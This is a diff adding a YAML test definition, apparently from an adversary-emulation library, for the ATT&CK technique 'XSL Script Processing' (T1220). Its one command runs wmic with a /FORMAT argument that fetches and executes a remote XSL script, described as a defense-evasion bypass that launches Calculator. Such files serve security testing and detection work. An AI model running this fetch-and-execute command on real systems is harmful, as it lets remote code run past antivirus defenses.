@@ -1,0 +1,16 @@
+- description: 'Executes the code specified within a XSL script using a remote payload.
+    Open Calculator.exe when test sucessfully executed, while AV turned off.
+
+    '
+  id: 7c705efb3ec2eb9a4858321f1d58b96e
+  name: WMIC bypass using remote XSL file
+  platforms:
+    windows:
+      cmd:
+        cleanup: ''
+        command: wmic process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
+        payloads: []
+  tactic: defense-evasion
+  technique:
+    attack_id: T1220
+    name: XSL Script Processing
